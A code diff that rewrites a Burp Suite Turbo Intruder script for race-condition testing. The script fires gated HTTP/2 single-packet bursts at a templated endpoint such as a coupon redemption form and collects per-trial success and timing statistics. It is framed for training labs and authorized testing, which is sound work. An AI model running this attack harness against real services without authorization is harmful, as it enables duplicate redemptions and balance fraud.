@@ -1,127 +1,76 @@
-```python
-"""
-Turbo Intruder Race Condition Lab Runner
-========================================
-
-Purpose
--------
-Experimental race-condition runner for:
-
-    - PortSwigger Web Security Academy
-    - Hack The Box laboratories
-    - Local/self-hosted vulnerable applications
-    - Authorized security testing
-
-Design
-------
-The script intentionally uses Turbo Intruder as the HTTP engine
-instead of implementing its own HTTP stack.
-
-Features
---------
-- HTTP/2 via Engine.BURP2
-- Single-connection synchronization
-- Gated request bursts
-- Multiple burst sizes
-- Multiple independent trials
-- Shared-payload mode
-- Unique-payload mode
-- Per-trial result tracking
-- Aggregate success-rate calculation
-- Automatic completion detection
-- Turbo Intruder result-table integration
-
-Request template
-----------------
-Put the following marker at the value you want Turbo Intruder
-to replace:
-
-    RACE_CONDITION
-
-Example:
-
-    POST /redeem HTTP/2
-    Host: lab.example
-    Content-Type: application/x-www-form-urlencoded
-
-    code=RACE_CONDITION
-
-IMPORTANT
----------
-Use only against systems you own or are explicitly authorized
-to test.
-
-The success detector MUST be adapted to the specific laboratory.
-A HTTP 200 response is NOT automatically evidence of a race.
-"""
-
-
-import random
-import string
-import time
+# Turbo Intruder — Race Condition Lab Runner v2.0
+#
+# Designed for authorized local/containerized labs.
+#
+# Features:
+#   - Burst matrix: 10 / 20 / 30 / 40 / 50 requests
+#   - Multiple independent trials per burst size
+#   - HTTP/2 single-packet attack using BURP2 + gates
+#   - Per-trial labels for reliable response attribution
+#   - Warmup separated from experiment statistics
+#   - Trial success rate
+#   - Response success rate
+#   - HTTP status distribution
+#   - Response timing statistics
+#   - Response ordering
+#   - Final experiment summary
+#
+# IMPORTANT:
+#   You MUST customize is_success() for the specific lab.
+#   HTTP 200 alone is NOT automatically considered a race success.
 
 
 # ============================================================
 # CONFIGURATION
 # ============================================================
 
-# Number of synchronized requests in each experiment.
-#
-# Example:
-#
-#   10 requests -> 10 trials
-#   20 requests -> 10 trials
-#   ...
-#
 BURST_SIZES = [10, 20, 30, 40, 50]
 
-
-# Number of independent experiments for every burst size.
 TRIALS_PER_SIZE = 10
 
-
-# Delay between completed bursts.
-#
-# This is NOT the synchronization mechanism.
-# Gates provide the synchronization.
-#
+# Delay between independent trials.
+# This separates experiments; it is NOT part of synchronization.
 BETWEEN_TRIALS = 0.15
 
+# Send one warmup request before the actual experiment.
+WARMUP_ENABLED = True
 
-# ------------------------------------------------------------
-# Payload mode
-# ------------------------------------------------------------
+# Reuse one value across the entire burst?
 #
 # True:
-#   Every request inside a burst receives the SAME value.
-#
-# Useful for testing situations where several requests compete
-# over the same logical resource/value.
+#   Every request in a burst uses the same generated token.
 #
 # False:
-#   Every request receives a UNIQUE value.
+#   Every request receives a different token.
 #
-# Useful for testing collision/creation-style scenarios.
-#
+# Choose according to the lab's semantics.
 SAME_PAYLOAD = True
 
+TOKEN_LENGTH = 12
 
-# Marker inside the request sent to Turbo Intruder.
+# Placeholder used in the request copied from Burp.
+#
+# Example request:
+#
+# POST /redeem HTTP/2
+# ...
+#
+# code=RACE_CONDITION
+#
+# The script replaces RACE_CONDITION.
 MARKER = "RACE_CONDITION"
 
 
-# Random token length.
-TOKEN_LENGTH = 12
+# ============================================================
+# ENGINE CONFIGURATION
+# ============================================================
 
-
-# ------------------------------------------------------------
-# Turbo Intruder / HTTP2
-# ------------------------------------------------------------
-
-# BURP2 + one connection is the important combination for
-# HTTP/2 single-packet race-condition testing.
+# BURP2 + one connection is the Turbo Intruder pattern used
+# for HTTP/2 single-packet race testing.
 CONCURRENT_CONNECTIONS = 1
 
+# BURP2 manages connection reuse itself.
+# This value is intentionally conservative/documentary.
 REQUESTS_PER_CONNECTION = 100
 
 
@@ -129,305 +78,454 @@ REQUESTS_PER_CONNECTION = 100
 # EXPERIMENT STATE
 # ============================================================
 
-# Example:
+# Number of actual experiment requests expected.
+EXPECTED_EXPERIMENT_RESPONSES = (
+    sum(BURST_SIZES) * TRIALS_PER_SIZE
+)
+
+# Number of experiment responses processed.
+experiment_responses = 0
+
+# Prevent the final report from being printed twice.
+report_printed = False
+
+
+# Structure:
 #
-# results["30"]["trial-4"]
-#
-# stores the outcome of burst size 30, trial 4.
+# results[size][trial] = {
+#     "expected": int,
+#     "received": int,
+#     "success": int,
+#     "statuses": {},
+#     "times": [],
+#     "orders": []
+# }
 #
 results = {}
 
 
-# Number of responses received by handleResponse().
-responses_handled = 0
-
-
-# Total number of requests that should be processed.
-TOTAL_EXPECTED = (
-    sum(BURST_SIZES) *
-    TRIALS_PER_SIZE
-)
-
-
-# Avoid printing the final report twice.
-summary_printed = False
-
-
 # ============================================================
-# TOKEN GENERATION
+# HELPERS
 # ============================================================
 
 def random_token(length=TOKEN_LENGTH):
+    """
+    Generate a simple alphanumeric token.
+
+    Turbo Intruder also provides payload helpers such as
+    $randomplz, but generating the value here makes the
+    experiment state explicit and reproducible.
+    """
 
     alphabet = (
-        string.ascii_letters +
-        string.digits
+        "abcdefghijklmnopqrstuvwxyz"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "0123456789"
     )
 
-    return ''.join(
-        random.choice(alphabet)
+    return "".join(
+        alphabet[__import__("random").randint(0, len(alphabet) - 1)]
         for _ in range(length)
     )
 
 
-# ============================================================
-# RESULT INITIALIZATION
-# ============================================================
+def parse_label(label):
+    """
+    Parse:
 
-def initialize_experiment(size, trial):
+        race:size=20:trial=3
 
-    if size not in results:
+    into:
+
+        (20, 3)
+
+    Returns None for non-experiment requests.
+    """
+
+    if not label:
+        return None
+
+    prefix = "race:size="
+
+    if not label.startswith(prefix):
+        return None
+
+    try:
+        remainder = label[len(prefix):]
+
+        size_text, trial_text = remainder.split(":trial=")
+
+        return int(size_text), int(trial_text)
+
+    except Exception:
+        return None
+
+
+def initialize_results():
+    """
+    Build the experiment matrix before sending requests.
+    """
+
+    for size in BURST_SIZES:
 
         results[size] = {}
 
-    trial_key = "trial-%d" % trial
+        for trial in range(1, TRIALS_PER_SIZE + 1):
 
-    if trial_key not in results[size]:
+            results[size][trial] = {
+                "expected": size,
+                "received": 0,
+                "success": 0,
+                "statuses": {},
+                "times": [],
+                "orders": []
+            }
 
-        results[size][trial_key] = {
-            "success": 0,
-            "failure": 0,
-            "total": 0,
-        }
-
-
-# ============================================================
-# RESULT RECORDING
-# ============================================================
-
-def record_result(size, trial, success):
-
-    initialize_experiment(
-        size,
-        trial
-    )
-
-    trial_key = "trial-%d" % trial
-
-    data = results[size][trial_key]
-
-    data["total"] += 1
-
-    if success:
-
-        data["success"] += 1
-
-    else:
-
-        data["failure"] += 1
-
-
-# ============================================================
-# SUCCESS DETECTOR
-# ============================================================
 
 def is_success(req):
     """
-    Customize this function for your laboratory.
+    ============================================================
+    LAB-SPECIFIC SUCCESS DETECTOR
+    ============================================================
 
-    This function answers:
+    THIS IS THE ONLY PART YOU SHOULD NORMALLY CHANGE.
 
-        "Does this response provide evidence that the
-         race condition occurred?"
+    Do NOT assume:
 
-    Do NOT use HTTP status alone unless that is genuinely
-    the vulnerability condition.
+        HTTP 200 == race success
 
-    --------------------------------------------------------
-    Example: JSON response
-    --------------------------------------------------------
+    A race-condition lab may instead indicate success using:
 
-        return b'"status":"success"' in body
+        - a different status code
+        - a response body marker
+        - a changed balance
+        - a duplicated object
+        - a successful redirect
+        - a different JSON field
+        - a particular error disappearing
+        - some second-order effect
 
-    --------------------------------------------------------
-    Example: application-specific message
-    --------------------------------------------------------
+    Example:
 
-        return b"coupon redeemed" in body
+        return req.status == 302
 
-    --------------------------------------------------------
-    Example: status-based lab
-    --------------------------------------------------------
+    Or:
 
-        return req.status == 201
+        return "already redeemed" not in req.response
 
-    Only use the last approach when the lab explicitly defines
-    that status as the race-condition indicator.
+    Or:
+
+        return '"success":true' in req.response
+
+    Replace the example below with the actual oracle
+    for your Docker lab.
     """
 
-    if req.response is None:
+    SUCCESS_STATUS_CODES = []
 
-        return False
-
-    body = req.response.lower()
-
-    # --------------------------------------------------------
-    # EXAMPLE ONLY
-    #
-    # Replace these with the actual indicator for your lab.
-    # --------------------------------------------------------
-
-    success_indicators = [
-        b"race_condition",
-        b"redeemed",
+    SUCCESS_MARKERS = [
+        # "SUCCESS",
+        # "race-won",
+        # '"success":true',
     ]
 
-    for indicator in success_indicators:
+    if req.status in SUCCESS_STATUS_CODES:
+        return True
 
-        if indicator in body:
+    response = req.response or ""
 
+    for marker in SUCCESS_MARKERS:
+
+        if marker in response:
             return True
 
     return False
 
 
-# ============================================================
-# LABEL PARSER
-# ============================================================
-
-def parse_label(label):
+def record_result(req, size, trial):
     """
-    Expected label format:
-
-        race:size=30:trial=7
-
-    Returns:
-
-        (30, 7)
-
-    or:
-
-        (None, None)
+    Record one experiment response.
     """
 
-    if not label:
+    global experiment_responses
 
-        return None, None
+    if size not in results:
+        return
 
-    parts = label.split(":")
+    if trial not in results[size]:
+        return
 
-    size = None
-    trial = None
+    trial_data = results[size][trial]
 
-    for part in parts:
+    trial_data["received"] += 1
 
-        if part.startswith("size="):
+    if is_success(req):
+        trial_data["success"] += 1
 
-            try:
+    status = req.status
 
-                size = int(
-                    part.split("=", 1)[1]
-                )
+    if status not in trial_data["statuses"]:
+        trial_data["statuses"][status] = 0
 
-            except:
+    trial_data["statuses"][status] += 1
 
-                size = None
+    # Turbo Intruder exposes response time in microseconds.
+    trial_data["times"].append(req.time)
 
-        elif part.startswith("trial="):
+    # req.order is the response order within the gate.
+    trial_data["orders"].append(req.order)
 
-            try:
+    experiment_responses += 1
 
-                trial = int(
-                    part.split("=", 1)[1]
-                )
 
-            except:
+def average(values):
+    if not values:
+        return 0
 
-                trial = None
+    return sum(values) / float(len(values))
 
-    return size, trial
+
+def min_value(values):
+    if not values:
+        return 0
+
+    return min(values)
+
+
+def max_value(values):
+    if not values:
+        return 0
+
+    return max(values)
+
+
+# ============================================================
+# REPORTING
+# ============================================================
+
+def report_trial(size, trial):
+    """
+    Print detailed information about one trial.
+    """
+
+    data = results[size][trial]
+
+    expected = data["expected"]
+    received = data["received"]
+    success = data["success"]
+
+    if expected:
+        response_rate = (
+            float(received) / expected
+        ) * 100.0
+    else:
+        response_rate = 0
+
+    times = data["times"]
+
+    print(
+        "[trial] "
+        "size=%d "
+        "trial=%d "
+        "received=%d/%d "
+        "success=%d "
+        "response_rate=%.1f%% "
+        "min=%dus "
+        "avg=%.0fus "
+        "max=%dus"
+        % (
+            size,
+            trial,
+            received,
+            expected,
+            success,
+            response_rate,
+            min_value(times),
+            average(times),
+            max_value(times)
+        )
+    )
+
+
+def report_summary():
+    """
+    Print the complete experiment report.
+    """
+
+    global report_printed
+
+    if report_printed:
+        return
+
+    report_printed = True
+
+    print("")
+    print("=" * 72)
+    print("RACE CONDITION LAB — EXPERIMENT SUMMARY")
+    print("=" * 72)
+
+    print(
+        "Expected experiment responses: %d"
+        % EXPECTED_EXPERIMENT_RESPONSES
+    )
+
+    print(
+        "Received experiment responses: %d"
+        % experiment_responses
+    )
+
+    print("")
+
+    for size in BURST_SIZES:
+
+        trial_successes = 0
+        total_success_responses = 0
+        total_responses = 0
+
+        all_times = []
+
+        print("-" * 72)
+        print("BURST SIZE: %d" % size)
+
+        for trial in range(1, TRIALS_PER_SIZE + 1):
+
+            data = results[size][trial]
+
+            received = data["received"]
+            success = data["success"]
+
+            total_responses += received
+            total_success_responses += success
+
+            all_times.extend(data["times"])
+
+            # A trial is considered successful if at least
+            # one response satisfies the lab-specific oracle.
+            if success > 0:
+                trial_successes += 1
+
+            report_trial(size, trial)
+
+        trial_rate = (
+            float(trial_successes) / TRIALS_PER_SIZE
+        ) * 100.0
+
+        response_rate = (
+            float(total_success_responses) / total_responses
+        ) * 100.0 if total_responses else 0
+
+        print("")
+        print(
+            "Trial success rate: %.1f%% (%d/%d)"
+            % (
+                trial_rate,
+                trial_successes,
+                TRIALS_PER_SIZE
+            )
+        )
+
+        print(
+            "Response success rate: %.1f%% (%d/%d)"
+            % (
+                response_rate,
+                total_success_responses,
+                total_responses
+            )
+        )
+
+        print(
+            "Timing: min=%dus avg=%.0fus max=%dus"
+            % (
+                min_value(all_times),
+                average(all_times),
+                max_value(all_times)
+            )
+        )
+
+    print("")
+    print("=" * 72)
+    print("EXPERIMENT COMPLETE")
+    print("=" * 72)
 
 
 # ============================================================
 # QUEUE REQUESTS
 # ============================================================
 
-def queueRequests(target, wordlist):
+def queueRequests(target, wordlists):
+
+    global results
+
+    initialize_results()
 
     engine = RequestEngine(
-
         endpoint=target.endpoint,
 
-        concurrentConnections=(
-            CONCURRENT_CONNECTIONS
-        ),
+        # HTTP/2 single-packet engine.
+        engine=Engine.BURP2,
 
-        requestsPerConnection=(
-            REQUESTS_PER_CONNECTION
-        ),
+        # Required pattern for the single-packet technique.
+        concurrentConnections=CONCURRENT_CONNECTIONS,
 
-        pipeline=False,
-
-        engine=Engine.BURP2
+        requestsPerConnection=REQUESTS_PER_CONNECTION
     )
 
-
-    # ========================================================
-    # WARM-UP
-    # ========================================================
-
-    warmup_gate = "race-warmup"
-
-    engine.queue(
-        target.req,
-        gate=warmup_gate,
-        label="race:warmup"
-    )
-
-    engine.openGate(
-        warmup_gate
-    )
+    # Keep state attached to the engine.
+    engine.userState["experiment"] = {
+        "expected": EXPECTED_EXPERIMENT_RESPONSES,
+        "warmup": WARMUP_ENABLED
+    }
 
 
-    # ========================================================
+    # --------------------------------------------------------
+    # WARMUP
+    # --------------------------------------------------------
+
+    if WARMUP_ENABLED:
+
+        engine.queue(
+            target.req,
+            label="warmup"
+        )
+
+        engine.openGate("warmup")
+
+
+    # --------------------------------------------------------
     # EXPERIMENT MATRIX
-    # ========================================================
+    # --------------------------------------------------------
 
     for burst_size in BURST_SIZES:
 
-        for trial in range(
-            1,
-            TRIALS_PER_SIZE + 1
-        ):
+        for trial in range(1, TRIALS_PER_SIZE + 1):
 
-            gate = (
+            gate_name = (
                 "race-size-%d-trial-%d"
-                % (
-                    burst_size,
-                    trial
-                )
+                % (burst_size, trial)
             )
-
 
             label = (
                 "race:size=%d:trial=%d"
-                % (
-                    burst_size,
-                    trial
-                )
+                % (burst_size, trial)
             )
 
 
             # ------------------------------------------------
-            # Shared payload
+            # PAYLOAD
             # ------------------------------------------------
+
+            shared_token = None
 
             if SAME_PAYLOAD:
 
                 shared_token = random_token()
 
-            else:
-
-                shared_token = None
-
 
             # ------------------------------------------------
-            # Queue entire burst BEFORE opening the gate.
+            # QUEUE BURST
             # ------------------------------------------------
 
-            for request_number in range(
-                burst_size
-            ):
+            for request_number in range(burst_size):
 
                 if SAME_PAYLOAD:
 
@@ -445,217 +543,28 @@ def queueRequests(target, wordlist):
 
 
                 engine.queue(
-
                     request,
-
-                    gate=gate,
-
+                    gate=gate_name,
                     label=label
                 )
 
 
             # ------------------------------------------------
-            # Release synchronized burst.
+            # RELEASE BURST
             # ------------------------------------------------
 
-            engine.openGate(
-                gate
-            )
+            engine.openGate(gate_name)
 
 
             # ------------------------------------------------
-            # Give the application a small recovery window
-            # before starting the next independent trial.
+            # SEPARATE INDEPENDENT TRIALS
             # ------------------------------------------------
 
             if BETWEEN_TRIALS > 0:
 
-                time.sleep(
+                __import__("time").sleep(
                     BETWEEN_TRIALS
                 )
-
-
-# ============================================================
-# FINAL REPORT
-# ============================================================
-
-def reportSummary():
-
-    global summary_printed
-
-    if summary_printed:
-
-        return
-
-    summary_printed = True
-
-
-    print("")
-    print("=" * 78)
-    print(" RACE CONDITION LAB RESULTS")
-    print("=" * 78)
-
-    print(
-        "%-10s %-10s %-10s %-10s %-14s"
-        % (
-            "Burst",
-            "Success",
-            "Failure",
-            "Trials",
-            "Success Rate"
-        )
-    )
-
-    print("-" * 78)
-
-
-    # --------------------------------------------------------
-    # Aggregate each burst size.
-    # --------------------------------------------------------
-
-    for size in BURST_SIZES:
-
-        success = 0
-        failure = 0
-        trials_with_results = 0
-
-
-        size_results = results.get(
-            size,
-            {}
-        )
-
-
-        for trial_data in size_results.values():
-
-            if trial_data["total"] == 0:
-
-                continue
-
-
-            trials_with_results += 1
-
-            if trial_data["success"] > 0:
-
-                success += 1
-
-            else:
-
-                failure += 1
-
-
-        if trials_with_results > 0:
-
-            success_rate = (
-                success /
-                trials_with_results
-            ) * 100.0
-
-        else:
-
-            success_rate = 0.0
-
-
-        print(
-            "%-10d %-10d %-10d %-10d %12.2f%%"
-            % (
-                size,
-                success,
-                failure,
-                trials_with_results,
-                success_rate
-            )
-        )
-
-
-    print("=" * 78)
-
-    print(
-        "Responses processed: %d / %d"
-        % (
-            responses_handled,
-            TOTAL_EXPECTED
-        )
-    )
-
-
-    print(
-        "Payload mode: %s"
-        % (
-            "SHARED"
-            if SAME_PAYLOAD
-            else "UNIQUE"
-        )
-    )
-
-
-    print("=" * 78)
-
-
-    # --------------------------------------------------------
-    # Detailed per-trial results
-    # --------------------------------------------------------
-
-    print("")
-    print("DETAILED TRIAL RESULTS")
-    print("-" * 78)
-
-
-    for size in BURST_SIZES:
-
-        size_results = results.get(
-            size,
-            {}
-        )
-
-
-        for trial in range(
-            1,
-            TRIALS_PER_SIZE + 1
-        ):
-
-            key = "trial-%d" % trial
-
-            data = size_results.get(
-                key
-            )
-
-
-            if data is None:
-
-                continue
-
-
-            total = data["total"]
-
-            if total:
-
-                rate = (
-                    data["success"] /
-                    total
-                ) * 100.0
-
-            else:
-
-                rate = 0.0
-
-
-            print(
-                "burst=%-4d trial=%-3d "
-                "requests=%-4d success=%-4d "
-                "failure=%-4d rate=%6.2f%%"
-                % (
-                    size,
-                    trial,
-                    total,
-                    data["success"],
-                    data["failure"],
-                    rate
-                )
-            )
-
-
-    print("-" * 78)
 
 
 # ============================================================
@@ -664,82 +573,36 @@ def reportSummary():
 
 def handleResponse(req, interesting):
 
-    global responses_handled
+    # Always expose responses in Turbo Intruder.
+    table.add(req)
 
-    responses_handled += 1
 
-
-    # --------------------------------------------------------
-    # Warm-up response
-    # --------------------------------------------------------
-
-    if req.label == "race:warmup":
+    # Warmup is intentionally excluded from experiment metrics.
+    if req.label == "warmup":
 
         return
 
 
-    # --------------------------------------------------------
-    # Recover experiment identity.
-    #
-    # Turbo Intruder exposes req.label to handleResponse().
-    # --------------------------------------------------------
+    parsed = parse_label(req.label)
 
-    size, trial = parse_label(
-        req.label
-    )
-
-
-    # --------------------------------------------------------
-    # Unknown label.
-    #
-    # Keep the response visible but do not corrupt statistics.
-    # --------------------------------------------------------
-
-    if size is None or trial is None:
-
-        table.add(
-            req,
-            interesting
-        )
+    if parsed is None:
 
         return
 
 
-    # --------------------------------------------------------
-    # Classify response.
-    # --------------------------------------------------------
-
-    success = is_success(
-        req
-    )
-
-
-    # --------------------------------------------------------
-    # Record result.
-    # --------------------------------------------------------
+    size, trial = parsed
 
     record_result(
-        size,
-        trial,
-        success
-    )
-
-
-    # --------------------------------------------------------
-    # Add response to Turbo Intruder's result table.
-    # --------------------------------------------------------
-
-    table.add(
         req,
-        interesting
+        size,
+        trial
     )
 
 
     # --------------------------------------------------------
-    # Experiment completion.
+    # COMPLETION CHECK
     # --------------------------------------------------------
 
-    if responses_handled >= TOTAL_EXPECTED:
+    if experiment_responses >= EXPECTED_EXPERIMENT_RESPONSES:
 
-        reportSummary()
-```
+        report_summary()
